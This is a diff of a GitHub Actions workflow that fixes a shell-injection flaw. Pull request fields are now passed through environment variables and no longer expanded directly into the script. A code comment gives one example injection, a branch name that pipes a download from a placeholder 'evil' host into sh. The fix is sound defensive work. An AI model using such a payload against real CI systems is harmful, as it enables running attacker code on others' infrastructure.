@@ -101,9 +101,16 @@ jobs:
       # test matrix or the count is unmeasurable (site_facts then exits 1).
       - run: pip install pyyaml "pytest~=9.0" "cryptography>=41,<50" "asn1crypto>=1.5.1,<2"
       - name: Scan modified Markdown/HTML for unverified claims
+        env:
+          # Passed via env, never interpolated into the shell. `base_ref` is
+          # a branch name chosen by whoever opens the PR — on a fork that is
+          # an untrusted party, and `${{ }}` expansion happens before the
+          # shell runs, so a branch named `main;curl evil|sh` would execute.
+          BASE_REF: ${{ github.base_ref }}
+          EVENT_NAME: ${{ github.event_name }}
         run: |
-          if [ "${{ github.event_name }}" = "pull_request" ]; then
-            python3 scripts/claim_auditor.py --diff-base origin/${{ github.base_ref }}
+          if [ "$EVENT_NAME" = "pull_request" ]; then
+            python3 scripts/claim_auditor.py --diff-base "origin/$BASE_REF"
           else
             python3 scripts/claim_auditor.py --diff-base HEAD~1
           fi
